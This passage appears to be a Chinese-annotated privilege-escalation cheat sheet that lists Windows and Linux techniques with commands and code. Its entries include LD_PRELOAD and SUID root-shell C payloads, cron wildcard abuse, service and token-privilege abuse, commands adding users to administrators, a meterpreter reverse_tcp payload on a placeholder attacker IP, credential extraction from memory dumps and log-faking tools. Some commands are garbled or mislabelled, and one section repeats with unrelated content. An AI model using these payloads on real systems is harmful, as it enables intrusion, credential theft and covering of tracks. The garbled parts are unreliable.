<pre class="line-numbers language-none"><code class="language-none">https:&#x2F;&#x2F;github.com&#x2F;JohnHammond&#x2F;msdt-follina<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<ol>
<li><code>python3 follina.py -c &quot;notepad&quot;</code></li>
</ol>
<h3 id="ALPC"><a href="#ALPC" class="headerlink" title="ALPC"></a>ALPC</h3><p>域名: Y&#x2F;N</p>
<p>Local Admin: Yes</p>
<p>操作系统: Windows</p>
<p>类型:  0&#x2F;1 Exploit</p>
<p>方法: </p>
<ol>
<li></li>
</ol>
<pre class="line-numbers language-none"><code class="language-none">https:&#x2F;&#x2F;github.com&#x2F;riparino&#x2F;Task_Scheduler_ALPC<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h3 id="RemotePotato0"><a href="#RemotePotato0" class="headerlink" title="RemotePotato0"></a>RemotePotato0</h3><p>域名: Y&#x2F;N</p>
<p>Local Admin: Yes</p>
<p>操作系统: Windows</p>
<p>类型:  0&#x2F;1 Exploit</p>
<p>方法: </p>
<ol>
<li><code>sudo ntlmrelayx.py -t ldap://10.0.0.10 –no-wcf-server –escalate-user normal_user</code></li>
<li><code>.\RemotePotato0.exe -m 0 -r 10.0.0.20 -x 10.0.0.20 -p 9999 -s 1</code></li>
</ol>
<p>批注：</p>
<p>ntlmrelayx.py只找到个很相似的：<a href="https://github.com/LuemmelSec/ntlmrelayx.py_to_exe">https://github.com/LuemmelSec/ntlmrelayx.py_to_exe</a></p>
<p>remotepotato：<a href="https://github.com/antonioCoco/RemotePotato0/releases/tag/1.2">https://github.com/antonioCoco/RemotePotato0/releases/tag/1.2</a></p>
<h3 id="CVE-2022-26923"><a href="#CVE-2022-26923" class="headerlink" title="CVE-2022-26923"></a>CVE-2022-26923</h3><p>域名: Y&#x2F;N</p>
<p>Local Admin: Yes</p>
<p>操作系统: Windows</p>
<p>类型:  0&#x2F;1 Exploit</p>
<p>方法: </p>
<ol>
<li><code>certipy req ‘lab.local/cve$:CVEPassword1234*@10.100.10.13’ -template Machine -dc-ip 10.10.10.10 -ca lab-ADCS-CA</code></li>
<li><code>Rubeus.exe asktgt /user:&quot;目标_sam名称&quot; /certificate:cert.pfx /password:&quot;CERTIFICATE_PASSWORD&quot; /domain:&quot;FQDN_域名&quot; /dc:&quot;域名_CONTROLLER&quot; /show</code></li>
</ol>
<p>批注：</p>
<p>rubeus：<a href="https://github.com/GhostPack/Rubeus">https://github.com/GhostPack/Rubeus</a></p>
<h3 id="MS14-068"><a href="#MS14-068" class="headerlink" title="MS14-068"></a>MS14-068</h3><p>域名: Y&#x2F;N</p>
<p>Local Admin: Yes</p>
<p>操作系统: Windows</p>
<p>类型:  0&#x2F;1 Exploit</p>
<p>方法: </p>
<ol>
<li><code>python ms14-068.py -u user-a-1@dom-a.loc -s S-1-5-21-557603841-771695929-1514560438-1103 -d dc-a-2003.dom-a.loc</code></li>
</ol>
<p>批注：</p>
<p>无py版本，exe版本：<a href="https://github.com/ianxtianxt/MS14-068">https://github.com/ianxtianxt/MS14-068</a></p>
<h3 id="Sudo-LD-PRELOAD"><a href="#Sudo-LD-PRELOAD" class="headerlink" title="Sudo LD_PRELOAD"></a>Sudo LD_PRELOAD</h3><p>域：No</p>
<p>Local Admin: Yes</p>
<p>操作系统: Linux</p>
<p>类型:  Injection</p>
<p>方法: </p>
<p>1. </p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/types.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span>
<span class="token keyword">void</span> <span class="token function">_init</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
<span class="token function">unsetenv</span><span class="token punctuation">(</span>“LD_PRELOAD”<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">setgid</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">setuid</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">system</span><span class="token punctuation">(</span>“<span class="token operator">/</span>bin<span class="token operator">/</span>bash”<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<ol>
<li><code>gcc -fPIC -shared -o /tmp/ldreload.so ldreload.c -nostartfiles</code></li>
<li><code>sudo LD_RELOAD=tmp/ldreload.so apache2</code></li>
</ol>
<h3 id="Abusing-File-Permission-via-SUID-Binaries-–-so-injection"><a href="#Abusing-File-Permission-via-SUID-Binaries-–-so-injection" class="headerlink" title="Abusing File Permission via SUID Binaries – .so injection)"></a>Abusing File Permission via SUID Binaries – .so injection)</h3><p>域：No</p>
<p>Local Admin: Yes</p>
<p>操作系统: Linux</p>
<p>类型:  Injection</p>
<p>方法: </p>
<ol>
<li><code>mkdir /home/user/.config</code></li>
<li></li>
</ol>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>

<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span>

<span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">inject</span><span class="token punctuation">(</span><span class="token punctuation">)</span> _attribute <span class="token function">_</span><span class="token punctuation">(</span><span class="token punctuation">(</span>constructor<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">void</span> <span class="token function">inject</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>

 <span class="token function">system</span><span class="token punctuation">(</span>“cp <span class="token operator">/</span>bin<span class="token operator">/</span>bash <span class="token operator">/</span>tmp<span class="token operator">/</span>bash <span class="token operator">&amp;&amp;</span> chmod <span class="token operator">+</span>s <span class="token operator">/</span>tmp<span class="token operator">/</span>bash <span class="token operator">&amp;&amp;</span> <span class="token operator">/</span>tmp<span class="token operator">/</span>bash <span class="token operator">-</span>p”<span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<ol>
<li><code>gcc -shared -o /home/user/.config/libcalc.so -fPIC/home/user/.config/libcalc.c</code></li>
<li><code>/usr/local/bin/suid-so</code></li>
</ol>
<p>​	<code>id</code></p>
<h3 id="DLL-Injection"><a href="#DLL-Injection" class="headerlink" title="DLL Injection"></a>DLL Injection</h3><p>域：No</p>
<p>Local Admin: Yes</p>
<p>操作系统: Windows</p>
<p>类型:  Injection</p>
<p>方法: </p>
<ol>
<li><code>RemoteDLLInjector64</code></li>
</ol>
<p>​		Or</p>
<p>​	<code>MemJect</code></p>
<p>​		Or</p>
<p>​	<code>https://github.com/tomcarver16/BOF-DLL-Inject</code></p>
<ol>
<li><code>#define PROCESS_NAME &quot;csgo.exe&quot;</code></li>
</ol>
<p>​		Or</p>
<p>​	<code>RemoteDLLInjector64.exe pid C:\runforpriv.dll</code></p>
<p>​		Or</p>
<p>​	<code>mandllinjection ./runforpriv.dll pid</code></p>
<p>批注：</p>
<p>remoteDllInjector：<a href="https://github.com/Al1ex/RemoteDLLInjector">https://github.com/Al1ex/RemoteDLLInjector</a></p>
<p>memject：<a href="https://github.com/danielkrupinski/MemJect">https://github.com/danielkrupinski/MemJect</a></p>
<h3 id="Early-Bird-Injection"><a href="#Early-Bird-Injection" class="headerlink" title="Early Bird Injection"></a>Early Bird Injection</h3><p>域：No</p>
<p>Local Admin: Yes</p>
<p>操作系统: Windows</p>
<p>类型:  Injection</p>
<p>方法: </p>
<ol>
<li></li>
</ol>
<pre class="line-numbers language-none"><code class="language-none">hollow svchost.exe pop.bin<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>



<p>批注：hollow链接<a href="https://github.com/m0n0ph1/Process-Hollowing">https://github.com/m0n0ph1/Process-Hollowing</a></p>
<h3 id="Process-Injection-through-Memory-Section"><a href="#Process-Injection-through-Memory-Section" class="headerlink" title="Process Injection through Memory Section"></a>Process Injection through Memory Section</h3><p>域：No</p>
<p>Local Admin: Yes</p>
<p>操作系统: Windows</p>
<p>类型:  Injection</p>
<p>方法: </p>
<ol>
<li><code>sec-shinject PID /path/to/bin</code></li>
</ol>
<p>批注：未找到</p>
<h3 id="Abusing-Scheduled-Tasks-via-Cron-Path-Overwrite"><a href="#Abusing-Scheduled-Tasks-via-Cron-Path-Overwrite" class="headerlink" title="Abusing Scheduled Tasks via Cron Path Overwrite"></a>Abusing Scheduled Tasks via Cron Path Overwrite</h3><p>域：No</p>
<p>Local Admin: Yes</p>
<p>操作系统: Linux</p>
<p>类型:  Abusing Scheduled Tasks</p>
<p>方法: </p>
<ol>
<li><code>echo &#39;cp /bin/bash /tmp/bash; chmod +s /tmp/bash&#39; &gt; systemupdate.sh;</code></li>
<li><code>chmod +x systemupdate.sh</code></li>
<li><code>等待一会儿</code></li>
<li><code>/tmp/bash -p</code></li>
<li><code>id &amp;&amp; whoami</code></li>
</ol>
<h3 id="Abusing-Scheduled-Tasks-via-Cron-Wildcards"><a href="#Abusing-Scheduled-Tasks-via-Cron-Wildcards" class="headerlink" title="Abusing Scheduled Tasks via Cron Wildcards"></a>Abusing Scheduled Tasks via Cron Wildcards</h3><p>域：No</p>
<p>Local Admin: Yes</p>
<p>操作系统: Linux</p>
<p>类型:  Abusing Scheduled Tasks</p>
<p>方法: </p>
<ol>
<li><code>echo &#39;cp /bin/bash /tmp/bash; chmod +s /tmp/bash&#39; &gt; /home/user/systemupdate.sh;</code></li>
<li><code>touch /home/user/ –checkpoint=1;</code></li>
<li><code>touch /home/user/ –checkpoint-action=exec=sh\systemupdate.sh</code></li>
<li><code>等待一会儿</code></li>
<li><code>/tmp/bash -p</code></li>
<li><code>id &amp;&amp; whoami</code></li>
</ol>
<h3 id="Abusing-File-Permission-via-SUID-Binaries-–-Symlink"><a href="#Abusing-File-Permission-via-SUID-Binaries-–-Symlink" class="headerlink" title="Abusing File Permission via SUID Binaries – Symlink)"></a>Abusing File Permission via SUID Binaries – Symlink)</h3><p>域：No</p>
<p>Local Admin: Yes</p>
<p>操作系统: Linux</p>
<p>类型:  Abusing File Permission</p>
<p>方法: </p>
<ol>
<li><code>su – www-data;</code></li>
<li><code>nginxed-root.sh /var/log/nginx/error.log;</code></li>
<li>In root user</li>
<li><code>invoke-rc.d nginx rotate &gt;/dev/null 2&gt;&amp;1</code></li>
</ol>
<h3 id="Abusing-File-Permission-via-SUID-Binaries-–-Environment-Variables-1"><a href="#Abusing-File-Permission-via-SUID-Binaries-–-Environment-Variables-1" class="headerlink" title="Abusing File Permission via SUID Binaries – Environment Variables #1)"></a>Abusing File Permission via SUID Binaries – Environment Variables #1)</h3><p>域：No</p>
<p>Local Admin: Yes</p>
<p>操作系统: Linux</p>
<p>类型:  Abusing File Permission</p>
<p>方法: </p>
<ol>
<li><code>echo &#39;int main() &#123; setgid(0); setuid(0); system(&quot;/bin/bash&quot;); return 0; &#125;&#39; &gt;/tmp/service.c;</code></li>
<li><code>gcc /tmp/services.c -o /tmp/service;</code></li>
<li><code>export PATH=/tmp:$PATH;</code></li>
<li><code>/usr/local/bin/sudi-env; id</code></li>
</ol>
<h3 id="Abusing-File-Permission-via-SUID-Binaries-–-Environment-Variables-2"><a href="#Abusing-File-Permission-via-SUID-Binaries-–-Environment-Variables-2" class="headerlink" title="Abusing File Permission via SUID Binaries – Environment Variables #2)"></a>Abusing File Permission via SUID Binaries – Environment Variables #2)</h3><p>域：No</p>
<p>Local Admin: Yes</p>
<p>操作系统: Linux</p>
<p>类型:  Abusing File Permission</p>
<p>方法: </p>
<ol>
<li><code>env -i SHELLOPTS=xtrace PS4=&#39;$(cp /bin/bash /tmp &amp;&amp; chown root.root /tmp/bash &amp;&amp; chmod +S /tmp/bash)&#39; /bin/sh -c /usr/local/bin/suid-env2; set +x; /tmp/bash -p</code></li>
</ol>
<h3 id="DLL-Hijacking"><a href="#DLL-Hijacking" class="headerlink" title="DLL Hijacking"></a>DLL Hijacking</h3><p>域：No</p>
<p>Local Admin: Yes</p>
<p>操作系统: Windows</p>
<p>类型:  Abuse Privilege</p>
<p>方法: </p>
<ol>
<li><code>Windows_dll.c: cmd.exe /k net localgroup administrators user /add</code></li>
<li><code>x86_64-w64-mingw32-gcc windows_dll.c -shared -o hijackme.dll</code></li>
<li><code>sc stop dllsvc &amp; sc start dllsvc</code></li>
</ol>
<h3 id="Abusing-Services-via-binPath"><a href="#Abusing-Services-via-binPath" class="headerlink" title="Abusing Services via binPath"></a>Abusing Services via binPath</h3><p>域：No</p>
<p>Local Admin: Yes</p>
<p>操作系统: Windows</p>
<p>类型:  Abuse Privilege</p>
<p>方法: </p>
<ol>
<li><code>sc config daclsvc binpath= &quot;net localgroup administrators user /add&quot;</code></li>
<li><code>sc start daclsvc</code></li>
</ol>
<h3 id="Abusing-Services-via-Unquoted-Path"><a href="#Abusing-Services-via-Unquoted-Path" class="headerlink" title="Abusing Services via Unquoted Path"></a>Abusing Services via Unquoted Path</h3><p>域：No</p>
<p>Local Admin: Yes</p>
<p>操作系统: Windows</p>
<p>类型:  Abuse Privilege</p>
<p>方法: </p>
<ol>
<li><code>msfvenom -p windows/exec CMD=’net localgroup administrators user /add’ -f exe-service -o common.exe</code></li>
<li><code>common.exe 放在 &#39;C:\Program Files\Unquoted Path Service&#39;.</code></li>
<li><code>sc start unquotedsvc</code></li>
</ol>
<h3 id="Abusing-Services-via-Registry"><a href="#Abusing-Services-via-Registry" class="headerlink" title="Abusing Services via Registry"></a>Abusing Services via Registry</h3><p>域：No</p>
<p>Local Admin: Yes</p>
<p>操作系统: Windows</p>
<p>类型:  Abuse Privilege</p>
<p>方法: </p>
<ol>
<li><code>reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t</code></li>
<li><code>REG_EXPAND_SZ /d c:\temp\x.exe /f</code></li>
<li><code>sc start regsvc</code></li>
</ol>
<h3 id="Abusing-Services-via-Executable-File"><a href="#Abusing-Services-via-Executable-File" class="headerlink" title="Abusing Services via Executable File"></a>Abusing Services via Executable File</h3><p>域：No</p>
<p>Local Admin: Yes</p>
<p>操作系统: Windows</p>
<p>类型:  Abuse Privilege</p>
<p>方法: </p>
<ol>
<li><code>copy /y c:\Temp\x.exe &quot;c:\Program Files\File Permissions Service\filepermservice.exe&quot;</code></li>
<li><code>sc start filepermsvc</code></li>
</ol>
<h3 id="Abusing-Services-via-Autorun"><a href="#Abusing-Services-via-Autorun" class="headerlink" title="Abusing Services via Autorun"></a>Abusing Services via Autorun</h3><p>域：No</p>
<p>Local Admin: Yes</p>
<p>操作系统: Windows</p>
<p>类型:  Abuse Privilege</p>
<p>方法: </p>
<ol>
<li></li>
</ol>
<p>In Metasploit (msf &gt; prompt) 类型： <code>use multi/handler</code></p>
<p>In Metasploit (msf &gt; prompt) 类型： <code>set payload windows/meterpreter/reverse_tcp</code></p>
<p>In Metasploit (msf &gt; prompt) 类型： <code>set lhost [Kali VM IP Address]</code></p>
<p>In Metasploit (msf &gt; prompt) 类型： <code>run</code></p>
<p>打开另一个命令提示符并键入:</p>
<pre class="line-numbers language-none"><code class="language-none">msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp lhost&#x3D;[Kali VM IP Address] -f exe -o program.exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<ol start="2">
<li></li>
</ol>
<pre class="line-numbers language-none"><code class="language-none">program.exe 放在 &#39;C:\Program Files\Autorun Program&#39;.<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h3 id="Abusing-Services-via-AlwaysInstallElevated"><a href="#Abusing-Services-via-AlwaysInstallElevated" class="headerlink" title="Abusing Services via AlwaysInstallElevated"></a>Abusing Services via AlwaysInstallElevated</h3><p>域：No</p>
<p>Local Admin: Yes</p>
<p>操作系统: Windows</p>
<p>类型:  Abuse Privilege</p>
<p>方法: </p>
<ol>
<li></li>
</ol>
<pre class="line-numbers language-none"><code class="language-none">msfvenom -p windows&#x2F;exec CMD&#x3D;&#39;net localgroup administrators user &#x2F;add&#39; -f msi-nouac -o setup.msi<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<ol start="2">
<li></li>
</ol>
<pre class="line-numbers language-none"><code class="language-none">msiexec &#x2F;quiet &#x2F;qn &#x2F;i C:\Temp\setup.msi<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>Or</p>
<pre class="line-numbers language-none"><code class="language-none">SharpUp.exe AlwaysInstallElevated<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>



<p>批注：sharpup链接<a href="https://github.com/GhostPack/SharpUp">https://github.com/GhostPack/SharpUp</a></p>
<h3 id="Abusing-Services-via-SeCreateToken"><a href="#Abusing-Services-via-SeCreateToken" class="headerlink" title="Abusing Services via SeCreateToken"></a>Abusing Services via SeCreateToken</h3><p>域：No</p>
<p>Local Admin: Yes</p>
<p>操作系统: Windows</p>
<p>类型:  Abuse Privilege</p>
<p>方法: </p>
<ol>
<li></li>
</ol>
<pre class="line-numbers language-none"><code class="language-none">.load C:\dev\PrivEditor\x64\Release\PrivEditor.dll<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<ol start="2">
<li></li>
</ol>
<pre class="line-numbers language-none"><code class="language-none">!rmpriv<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h3 id="Abusing-Services-via-SeDebug"><a href="#Abusing-Services-via-SeDebug" class="headerlink" title="Abusing Services via SeDebug"></a>Abusing Services via SeDebug</h3><p>域：No</p>
<p>Local Admin: Yes</p>
<p>操作系统: Windows</p>
<p>类型:  Abuse Privilege</p>
<p>方法: </p>
<ol>
<li></li>
</ol>
<pre class="line-numbers language-none"><code class="language-none">Conjure-LSASS<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>Or</p>
<pre class="line-numbers language-none"><code class="language-none">syscall_enable_priv 20<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h3 id="Remote-Process-via-Syscalls-HellsGate-Hal操作系统Gate"><a href="#Remote-Process-via-Syscalls-HellsGate-Hal操作系统Gate" class="headerlink" title="Remote Process via Syscalls (HellsGate|Hal操作系统Gate)"></a>Remote Process via Syscalls (HellsGate|Hal操作系统Gate)</h3><p>域：No</p>
<p>Local Admin: Yes</p>
<p>操作系统: Windows</p>
<p>类型:  Abuse Privilege</p>
<p>方法: </p>
<ol>
<li></li>
</ol>
<pre class="line-numbers language-none"><code class="language-none">injectEtwBypass pid<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>



<p>批注：<a href="https://github.com/boku7/injectEtwBypass">https://github.com/boku7/injectEtwBypass</a></p>
<h3 id="Escalate-With-DuplicateTokenEx"><a href="#Escalate-With-DuplicateTokenEx" class="headerlink" title="Escalate With DuplicateTokenEx"></a>Escalate With DuplicateTokenEx</h3><p>域：Yes</p>
<p>Local Admin: Yes</p>
<p>操作系统: Windows</p>
<p>类型: Abuse Privilege</p>
<p>方法: </p>
<pre class="line-numbers language-none"><code class="language-none">PrimaryTokenTheft.exe pid<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>Or</p>
<pre class="line-numbers language-none"><code class="language-none">TokenPlaye.exe –impersonate –pid pid<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>



<p>批注：</p>
<p>primarytokenthenft：<a href="https://github.com/slyd0g/PrimaryTokenTheft">https://github.com/slyd0g/PrimaryTokenTheft</a></p>
<p>tokenplaye：<a href="https://github.com/S1ckB0y1337/TokenPlayer/releases/tag/v0.8">https://github.com/S1ckB0y1337/TokenPlayer/releases/tag/v0.8</a></p>
<h3 id="Abusing-Services-via-SeIncreaseBasePriority"><a href="#Abusing-Services-via-SeIncreaseBasePriority" class="headerlink" title="Abusing Services via SeIncreaseBasePriority"></a>Abusing Services via SeIncreaseBasePriority</h3><p>域：No</p>
<p>Local Admin: Yes</p>
<p>操作系统: Windows</p>
<p>类型:  Abuse Privilege</p>
<p>方法: </p>
<ol>
<li></li>
</ol>
<pre class="line-numbers language-none"><code class="language-none">start &#x2F;realtime SomeCpuIntensiveApp.exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>



<p>批注：</p>
<p>找了一圈，只有这儿有相关内容：<a href="https://github.com/gtworek/Priv2Admin">https://github.com/gtworek/Priv2Admin</a></p>
<h3 id="Abusing-Services-via-SeManageVolume"><a href="#Abusing-Services-via-SeManageVolume" class="headerlink" title="Abusing Services via SeManageVolume"></a>Abusing Services via SeManageVolume</h3><p>域：No</p>
<p>Local Admin: Yes</p>
<p>操作系统: Windows</p>
<p>类型:  Abuse Privilege</p>
<p>方法: </p>
<ol>
<li></li>
</ol>
<pre class="line-numbers language-none"><code class="language-none">只需编译并运行SeManageVolumeAbuse<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>



<p>批注：<a href="https://github.com/xct/SeManageVolumeAbuse">https://github.com/xct/SeManageVolumeAbuse</a></p>
<h3 id="Abusing-Services-via-SeRelabel"><a href="#Abusing-Services-via-SeRelabel" class="headerlink" title="Abusing Services via SeRelabel"></a>Abusing Services via SeRelabel</h3><p>域：No</p>
<p>Local Admin: Yes</p>
<p>操作系统: Windows</p>
<p>类型:  Abuse Privilege</p>
<p>方法: </p>
<ol>
<li></li>
</ol>
<pre class="line-numbers language-none"><code class="language-none">WRITE_OWNER对资源的访问权限，包括文件和文件夹。<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<ol start="2">
<li></li>
</ol>
<pre class="line-numbers language-none"><code class="language-none">Run for privilege escalation<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h3 id="Abusing-Services-via-SeRestore"><a href="#Abusing-Services-via-SeRestore" class="headerlink" title="Abusing Services via SeRestore"></a>Abusing Services via SeRestore</h3><p>域：No</p>
<p>Local Admin: Yes</p>
<p>操作系统: Windows</p>
<p>类型:  Abuse Privilege</p>
<p>方法: </p>
<ol>
<li><code>启动具有 SeRestore 权限的 PowerShell/ISE</code>.</li>
<li><code>使用Enable-SeRestorePrivilege 启用权限</code>.</li>
<li><code>将utilman.exe重命名为utilman.old</code></li>
<li><code>将cmd.exe重命名为utilman.exe</code></li>
<li><code>锁定控制台并按Win+U</code></li>
</ol>
<h3 id="Abuse-via-SeBackup"><a href="#Abuse-via-SeBackup" class="headerlink" title="Abuse via SeBackup"></a>Abuse via SeBackup</h3><p>域：No</p>
<p>Local Admin: Yes</p>
<p>操作系统: Windows</p>
<p>类型:  Abuse Privilege</p>
<p>方法: </p>
<ol>
<li></li>
</ol>
<p>In Metasploit (msf &gt; prompt) 输入: <code>use auxiliary/server/capture/http_basic</code></p>
<p>In Metasploit (msf &gt; prompt) 输入: <code>set uripath x</code></p>
<p>In Metasploit (msf &gt; prompt) 输入: <code>run</code></p>
<ol start="2">
<li></li>
</ol>
<pre class="line-numbers language-none"><code class="language-none">在taskmgr中，右键单击“Image Name”栏中的“iexplore.exe”
并从弹出菜单中选择“创建转储文件”.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<ol start="3">
<li></li>
</ol>
<pre class="line-numbers language-none"><code class="language-none">strings &#x2F;root&#x2F;Desktop&#x2F;iexplore.DMP | grep &quot;Authorization: Basic&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>选择复制 Base64 编码字符串</p>
<p>在命令提示符下键入： <code>echo -ne [Base64 String] | Base64-d</code></p>
<h3 id="Abusing-via-SeCreatePagefile"><a href="#Abusing-via-SeCreatePagefile" class="headerlink" title="Abusing via SeCreatePagefile"></a>Abusing via SeCreatePagefile</h3><p>域：No</p>
<p>Local Admin: Yes</p>
<p>操作系统: Windows</p>
<p>类型:  Abuse Privilege</p>
<p>方法: </p>
<ol>
<li></li>
</ol>
<pre class="line-numbers language-none"><code class="language-none">HIBR2BIN &#x2F;PLATFORM X64 &#x2F;MAJOR 6 &#x2F;MINOR 1 &#x2F;INPUT hiberfil.sys &#x2F;OUTPUT uncompressed.bin<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>



<p>批注：<a href="https://github.com/MagnetForensics/Hibr2Bin">https://github.com/MagnetForensics/Hibr2Bin</a></p>
<h3 id="Abusing-via-SeSystemEnvironment"><a href="#Abusing-via-SeSystemEnvironment" class="headerlink" title="Abusing via SeSystemEnvironment"></a>Abusing via SeSystemEnvironment</h3><p>域：No</p>
<p>Local Admin: Yes</p>
<p>操作系统: Windows</p>
<p>类型:  Abuse Privilege</p>
<p>方法: </p>
<ol>
<li></li>
</ol>
<p>.<code>load C:\dev\PrivEditor\x64\Release\PrivEditor.dll</code></p>
<ol start="2">
<li></li>
</ol>
<pre class="line-numbers language-none"><code class="language-none">TrustExec.exe -m exec -c &quot;whoami &#x2F;priv&quot; -f<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>



<p>批注：两个工具都没找到QAQ</p>
<h3 id="Abusing-via-SeTakeOwnership"><a href="#Abusing-via-SeTakeOwnership" class="headerlink" title="Abusing via SeTakeOwnership"></a>Abusing via SeTakeOwnership</h3><p>域：No</p>
<p>Local Admin: Yes</p>
<p>操作系统: Windows</p>
<p>类型:  Abuse Privilege</p>
<p>方法: </p>
<ol>
<li><code>takeown.exe /f &quot;%windir%\system32&quot;</code></li>
<li><code>icalcs.exe &quot;%windir%\system32&quot; /grant &quot;%username%&quot;:F</code></li>
<li>将cmd.exe重命名为utilman.exe</li>
<li>锁定控制台并按Win+U</li>
</ol>
<h3 id="Abusing-via-SeTcb"><a href="#Abusing-via-SeTcb" class="headerlink" title="Abusing via SeTcb"></a>Abusing via SeTcb</h3><p>域：No</p>
<p>Local Admin: Yes</p>
<p>操作系统: Windows</p>
<p>类型:  Abuse Privilege</p>
<p>方法: </p>
<ol>
<li></li>
</ol>
<p>​	<code>PSBits</code></p>
<p>​		Or</p>
<p>​	<code>PrivFu</code></p>
<ol start="2">
<li></li>
</ol>
<pre class="line-numbers language-none"><code class="language-none">psexec.exe -i -s -d cmd.exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h3 id="Abusing-via-SeTrustedCredManAccess"><a href="#Abusing-via-SeTrustedCredManAccess" class="headerlink" title="Abusing via SeTrustedCredManAccess"></a>Abusing via SeTrustedCredManAccess</h3><p>域：No</p>
<p>Local Admin: Yes</p>
<p>操作系统: Windows</p>
<p>类型:  Abuse Privilege</p>
<p>方法: </p>
<ol>
<li></li>
</ol>
<p>​	<code>.load C:\dev\PrivEditor\x64\Release\PrivEditor.dll</code></p>
<p>​		Or</p>
<p>​	<code>CredManBOF</code></p>
<ol start="2">
<li></li>
</ol>
<pre class="line-numbers language-none"><code class="language-none">TrustExec.exe -m exec -c &quot;whoami &#x2F;priv&quot; -f<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h3 id="Abusing-tokens-via-SeAssignPrimaryToken"><a href="#Abusing-tokens-via-SeAssignPrimaryToken" class="headerlink" title="Abusing tokens via SeAssignPrimaryToken"></a>Abusing tokens via SeAssignPrimaryToken</h3><p>域：No</p>
<p>Local Admin: Yes</p>
<p>操作系统: Windows</p>
<p>类型:  Abuse Privilege</p>
<p>方法: </p>
<ol>
<li></li>
</ol>
<p>​	<code>JuicyPotato.exe</code></p>
<p>​		Or</p>
<p>​	<code>https://github.com/decoder-it/juicy_2</code></p>
<p>​	<code>https://github.com/antonioCoco/RoguePotato</code></p>
<h3 id="Abusing-via-SeCreatePagefile-1"><a href="#Abusing-via-SeCreatePagefile-1" class="headerlink" title="Abusing via SeCreatePagefile"></a>Abusing via SeCreatePagefile</h3><p>域：No</p>
<p>Local Admin: Yes</p>
<p>操作系统: Windows</p>
<p>类型:  Abuse Privilege</p>
<p>方法: </p>
<ol>
<li></li>
</ol>
<pre class="line-numbers language-none"><code class="language-none">.&#x2F;WELA.ps1 -LogFile .\Security.evtx -EventIDStatistics<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<ol start="2">
<li></li>
</ol>
<pre class="line-numbers language-none"><code class="language-none">flog -s 10s -n 200<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>​	Or</p>
<pre class="line-numbers language-none"><code class="language-none">invoke-module LogCleaner.ps1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>



<p>批注：wela链接<a href="https://github.com/Yamato-Security/WELA">https://github.com/Yamato-Security/WELA</a></p>
<p>日志伪造工具flog：<a href="https://github.com/mingrammer/flog">https://github.com/mingrammer/flog</a></p>
<h3 id="Certificate-Abuse"><a href="#Certificate-Abuse" class="headerlink" title="Certificate Abuse"></a>Certificate Abuse</h3><p>域：Yes</p>
<p>Local Admin: Yes</p>
<p>操作系统: Windows</p>
<p>类型:  Abusing Certificate</p>
<p>方法: </p>
<ol>
<li></li>
</ol>
<pre class="line-numbers language-none"><code class="language-none">ceritify.exe request &#x2F;ca:dc.domain.local\DC-CA &#x2F;template:User…<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<ol start="2">
<li></li>
</ol>
